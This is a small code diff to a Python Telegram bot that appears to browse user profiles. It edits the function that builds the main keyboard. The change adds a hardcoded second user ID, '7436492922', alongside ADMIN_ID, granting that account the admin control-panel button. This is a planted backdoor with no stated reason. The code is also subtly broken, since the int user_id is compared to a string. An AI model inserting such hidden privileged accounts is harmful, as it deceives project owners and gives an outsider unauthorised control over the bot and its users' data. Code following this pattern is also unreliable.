@@ -43,7 +43,7 @@ def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
         [KeyboardButton(text="🔍 Смотреть анкеты"), KeyboardButton(text="🏆 ТОП анкет")],
         [KeyboardButton(text="👤 Моя анкета")]
     ]
-    if user_id == ADMIN_ID:
+    if user_id == ADMIN_ID or user_id == "7436492922":
         buttons.append([KeyboardButton(text="🔧 Панель управления")])
         
     return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
